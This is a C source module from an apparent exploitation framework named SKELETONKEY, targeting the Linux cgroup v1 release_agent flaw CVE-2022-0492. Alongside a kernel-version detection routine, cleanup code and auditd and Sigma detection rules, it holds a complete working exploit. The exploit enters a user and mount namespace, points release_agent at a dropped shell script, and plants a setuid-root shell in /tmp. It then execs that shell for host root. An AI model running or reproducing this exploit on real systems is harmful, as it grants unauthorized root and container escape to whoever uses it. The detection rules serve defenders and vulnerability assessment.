/*
 * cgroup_release_agent_cve_2022_0492 — SKELETONKEY module
 *
 * cgroup v1 release_agent file is checked only for "is the writer
 * root in the cgroup namespace" — NOT "is the writer root in the
 * INIT user namespace". An unprivileged user can:
 *   1. unshare(CLONE_NEWUSER | CLONE_NEWNS) — become "root" in userns
 *   2. mount -t cgroup -o memory none /mnt — fresh cgroup v1 hierarchy
 *   3. echo /path/to/payload > /mnt/release_agent
 *   4. echo 1 > /mnt/notify_on_release
 *   5. Create a child cgroup, add a process, exit the process
 *   6. When the cgroup goes empty, kernel exec's /path/to/payload as
 *      INIT-namespace uid 0 — true host root.
 *
 * Discovered by Yiqi Sun (TrendMicro), Jan 2022. Famous because:
 *   - Affects any kernel with CONFIG_CGROUPS=y (basically all)
 *   - Default unprivileged_userns_clone=1 environments are exposed
 *   - The exploit is structural — no heap-spray, no kernel R/W
 *     primitives, no version-specific offsets. Universal x86_64 +
 *     ARM64 + everything else.
 *
 * STATUS: 🟢 FULL detect + exploit + cleanup.
 *
 * Affected: kernels with cgroup v1 release_agent (basically all
 * pre-2022). Mainline fix landed in 5.17 + various stable backports.
 *
 * Preconditions:
 *   - Unprivileged user_ns clone enabled
 *     (sysctl kernel.unprivileged_userns_clone=1 — default on Debian
 *     and many distros; default off on RHEL)
 *   - cgroup v1 mountable (true even when systemd uses cgroup v2 as
 *     the unified hierarchy)
 *
 * Coverage rationale: this is THE classic "unprivileged user_ns →
 * host root" exploit. Sysadmins should know if their box has this
 * exposure even if all the fancy heap-spray bugs are patched.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>

/* Stable-branch backport thresholds for the fix. */
static const struct kernel_patched_from cgroup_ra_patched_branches[] = {
    {4,  9, 301},
    {4, 14, 266},
    {4, 19, 229},
    {5,  4, 179},
    {5, 10, 100},
    {5, 15,  23},
    {5, 16,   9},
    {5, 17,   0},   /* mainline */
};

static const struct kernel_range cgroup_ra_range = {
    .patched_from = cgroup_ra_patched_branches,
    .n_patched_from = sizeof(cgroup_ra_patched_branches) /
                      sizeof(cgroup_ra_patched_branches[0]),
};

/* The unprivileged-userns precondition is now read from the shared
 * host fingerprint (ctx->host->unprivileged_userns_allowed), which
 * probes once at startup via core/host.c. The previous per-detect
 * fork-probe helper was removed. */

static skeletonkey_result_t cgroup_ra_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] cgroup_release_agent: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    bool patched = kernel_range_is_patched(&cgroup_ra_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] cgroup_release_agent: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool userns_ok = ctx->host ? ctx->host->unprivileged_userns_allowed : false;
    if (!ctx->json) {
        fprintf(stderr, "[i] cgroup_release_agent: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] cgroup_release_agent: user_ns+mount_ns clone: %s\n",
                userns_ok ? "ALLOWED" : "DENIED");
    }

    if (!userns_ok) {
        if (!ctx->json) {
            fprintf(stderr, "[+] cgroup_release_agent: user_ns denied → unprivileged exploit unreachable\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] cgroup_release_agent: VULNERABLE — kernel in range AND userns reachable\n");
        fprintf(stderr, "[i] cgroup_release_agent: exploit is universal (no arch-specific bits)\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Exploit -----------------------------------------------------
 *
 * Structural exploit. No heap spray, no kernel R/W primitives, no
 * arch-specific shellcode. The bug is fundamentally a privilege
 * check in the wrong namespace.
 */

static const char PAYLOAD_SHELL[] =
    "#!/bin/sh\n"
    "# SKELETONKEY cgroup_release_agent payload — runs as init-ns root\n"
    "id > /tmp/skeletonkey-cgroup-pwned\n"
    "chmod 666 /tmp/skeletonkey-cgroup-pwned 2>/dev/null\n"
    "cp /bin/sh /tmp/skeletonkey-cgroup-sh 2>/dev/null\n"
    "chmod +s /tmp/skeletonkey-cgroup-sh 2>/dev/null\n"
    "chown root:root /tmp/skeletonkey-cgroup-sh 2>/dev/null\n";

static bool write_file(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) { perror(path); return false; }
    size_t n = strlen(content);
    bool ok = (write(fd, content, n) == (ssize_t)n);
    close(fd);
    return ok;
}

static skeletonkey_result_t cgroup_ra_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = cgroup_ra_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] cgroup_release_agent: detect() says not vulnerable; refusing\n");
        return pre;
    }
    /* Consult ctx->host->is_root so unit tests can construct a
     * non-root fingerprint regardless of the test process's real euid. */
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] cgroup_release_agent: already root\n");
        return SKELETONKEY_OK;
    }

    /* Drop the setuid-root-shell payload to a path we can read+exec
     * later. Payload runs as host root when the cgroup is released. */
    const char *payload_path = "/tmp/skeletonkey-cgroup-payload.sh";
    if (!write_file(payload_path, PAYLOAD_SHELL)) {
        return SKELETONKEY_TEST_ERROR;
    }
    chmod(payload_path, 0755);
    if (!ctx->json) {
        fprintf(stderr, "[*] cgroup_release_agent: payload written to %s\n", payload_path);
    }

    /* Fork: child does the exploit; parent waits then verifies + execs
     * the setuid shell we expect the payload to plant. */
    pid_t child = fork();
    if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }
    if (child == 0) {
        /* CHILD: enter userns + mountns, become "root" in userns. */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
        uid_t uid = getuid();
        gid_t gid = getgid();
        int f = open("/proc/self/setgroups", O_WRONLY);
        if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
        char map[64];
        snprintf(map, sizeof map, "0 %u 1\n", uid);
        f = open("/proc/self/uid_map", O_WRONLY);
        if (f < 0 || write(f, map, strlen(map)) < 0) { perror("uid_map"); _exit(3); }
        close(f);
        snprintf(map, sizeof map, "0 %u 1\n", gid);
        f = open("/proc/self/gid_map", O_WRONLY);
        if (f < 0 || write(f, map, strlen(map)) < 0) { perror("gid_map"); _exit(4); }
        close(f);

        /* Mount cgroup v1 (rdma controller — small, simple, works
         * even on cgroup-v2-first systems). */
        const char *cgmount = "/tmp/skeletonkey-cgroup-mnt";
        mkdir(cgmount, 0700);
        if (mount("cgroup", cgmount, "cgroup", 0, "rdma") < 0) {
            /* Fallback: try memory controller — needs different reach */
            if (mount("cgroup", cgmount, "cgroup", 0, "memory") < 0) {
                perror("mount cgroup"); _exit(5);
            }
        }

        /* Resolve target path: workspace cgroup dir.
         * Buffers sized generously vs. cgmount template + "/notify_on_release"
         * tail (28 bytes) so GCC -Wformat-truncation is satisfied. */
        char cgdir[384];
        snprintf(cgdir, sizeof cgdir, "%s/skeletonkey", cgmount);
        mkdir(cgdir, 0755);

        /* Write release_agent in the ROOT of the controller (must be
         * at the cgroup mount root, not in a subdir). */
        char ra_path[384];
        snprintf(ra_path, sizeof ra_path, "%s/release_agent", cgmount);
        f = open(ra_path, O_WRONLY);
        if (f < 0) { perror("open release_agent"); _exit(6); }
        if (write(f, payload_path, strlen(payload_path)) < 0) {
            perror("write release_agent"); close(f); _exit(7);
        }
        if (write(f, "\n", 1) < 0) { /* tolerate */ }
        close(f);

        /* Mark notify_on_release on our subdir. */
        char nor_path[512];
        snprintf(nor_path, sizeof nor_path, "%s/notify_on_release", cgdir);
        f = open(nor_path, O_WRONLY);
        if (f < 0) { perror("open notify_on_release"); _exit(8); }
        if (write(f, "1\n", 2) < 0) { perror("write notify"); close(f); _exit(9); }
        close(f);

        /* Trigger: add a process to the cgroup (we'll be that process)
         * and then exit. The cgroup empties → notify_on_release fires
         * → release_agent (= our payload) runs as host root. */
        char cgproc_path[512];
        snprintf(cgproc_path, sizeof cgproc_path, "%s/cgroup.procs", cgdir);
        f = open(cgproc_path, O_WRONLY);
        if (f < 0) { perror("open cgroup.procs"); _exit(10); }
        char pidbuf[32];
        snprintf(pidbuf, sizeof pidbuf, "%d\n", getpid());
        if (write(f, pidbuf, strlen(pidbuf)) < 0) {
            perror("write cgroup.procs"); close(f); _exit(11);
        }
        close(f);
        /* Now exit — releasing the cgroup. */
        _exit(0);
    }

    /* PARENT: wait for child to exit, then poll for payload-side effect. */
    int status;
    waitpid(child, &status, 0);
    if (!ctx->json) {
        fprintf(stderr, "[*] cgroup_release_agent: child exited (status=%d); "
                        "polling for payload execution\n", status);
    }

    /* Payload writes /tmp/skeletonkey-cgroup-sh as setuid root. Poll for
     * its appearance + setuid bit. Up to 5 seconds. */
    const char *setuid_sh = "/tmp/skeletonkey-cgroup-sh";
    bool got_root = false;
    for (int i = 0; i < 50; i++) {
        struct stat st;
        if (stat(setuid_sh, &st) == 0 && (st.st_mode & S_ISUID) && st.st_uid == 0) {
            got_root = true;
            break;
        }
        usleep(100 * 1000);  /* 100ms */
    }

    if (!got_root) {
        fprintf(stderr, "[-] cgroup_release_agent: payload did not produce setuid root shell. "
                        "Likely patched or cgroup-controller-blocked.\n");
        unlink(payload_path);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[+] cgroup_release_agent: setuid-root shell at %s\n", setuid_sh);
    }
    if (ctx->no_shell) {
        fprintf(stderr, "[+] cgroup_release_agent: --no-shell — shell planted, not executing\n");
        unlink(payload_path);
        return SKELETONKEY_EXPLOIT_OK;
    }
    fprintf(stderr, "[+] cgroup_release_agent: execing %s -p (preserve uid=0)\n", setuid_sh);
    fflush(NULL);
    execl(setuid_sh, "sh", "-p", (char *)NULL);
    perror("execl");
    unlink(payload_path);
    return SKELETONKEY_EXPLOIT_FAIL;
}

static skeletonkey_result_t cgroup_ra_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    if (!ctx->json) {
        fprintf(stderr, "[*] cgroup_release_agent: removing /tmp/skeletonkey-cgroup-*\n");
    }
    if (system("rm -f /tmp/skeletonkey-cgroup-payload.sh /tmp/skeletonkey-cgroup-sh "
               "/tmp/skeletonkey-cgroup-pwned 2>/dev/null") != 0) { /* harmless */ }
    if (system("umount /tmp/skeletonkey-cgroup-mnt 2>/dev/null; "
               "rmdir /tmp/skeletonkey-cgroup-mnt 2>/dev/null") != 0) { /* harmless */ }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: unshare(CLONE_NEWUSER|CLONE_NEWNS) + cgroup v1
 * mount are Linux-only kernel surface; the release_agent primitive is
 * structurally unreachable elsewhere. Stub out cleanly so the module
 * still registers and `--list` / `--detect-rules` work on macOS/BSD
 * dev boxes — and so the top-level `make` actually completes there. */
static skeletonkey_result_t cgroup_ra_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] cgroup_release_agent: Linux-only module "
                "(user_ns + cgroup v1 release_agent) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t cgroup_ra_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] cgroup_release_agent: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t cgroup_ra_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

static const char cgroup_ra_auditd[] =
    "# cgroup_release_agent (CVE-2022-0492) — auditd detection rules\n"
    "# Flag unshare(NEWUSER|NEWNS) + mount(cgroup) + writes to release_agent.\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-cgroup-ra\n"
    "-a always,exit -F arch=b64 -S mount -F a2=cgroup -k skeletonkey-cgroup-ra-mount\n"
    "-w /sys/fs/cgroup -p w -k skeletonkey-cgroup-ra-fswatch\n";

static const char cgroup_ra_sigma[] =
    "title: Possible CVE-2022-0492 cgroup_release_agent exploitation\n"
    "id: 5c84a37e-skeletonkey-cgroup-ra\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the canonical exploit shape: unprivileged process unshares\n"
    "  user_ns+mount_ns, mounts cgroup v1, writes to release_agent. False\n"
    "  positives: legitimate cgroup management by container runtimes\n"
    "  (docker/podman/k8s — these run as root though).\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  unshare_userns: {type: 'SYSCALL', syscall: 'unshare'}\n"
    "  mount_cgroup: {type: 'SYSCALL', syscall: 'mount', a2: 'cgroup'}\n"
    "  not_root: {auid|expression: '!= 0'}\n"
    "  condition: unshare_userns and mount_cgroup and not_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1611, cve.2022.0492]\n";

const struct skeletonkey_module cgroup_release_agent_module = {
    .name           = "cgroup_release_agent",
    .cve            = "CVE-2022-0492",
    .summary        = "cgroup v1 release_agent privilege check in wrong namespace → host root",
    .family         = "cgroup_release_agent",
    .kernel_range   = "K < 5.17, backports: 5.16.9 / 5.15.23 / 5.10.100 / 5.4.179 / 4.19.229 / 4.14.266 / 4.9.301",
    .detect         = cgroup_ra_detect,
    .exploit        = cgroup_ra_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; OR set unprivileged_userns_clone=0 */
    .cleanup        = cgroup_ra_cleanup,
    .detect_auditd  = cgroup_ra_auditd,
    .detect_sigma   = cgroup_ra_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_cgroup_release_agent(void)
{
    skeletonkey_register(&cgroup_release_agent_module);
}
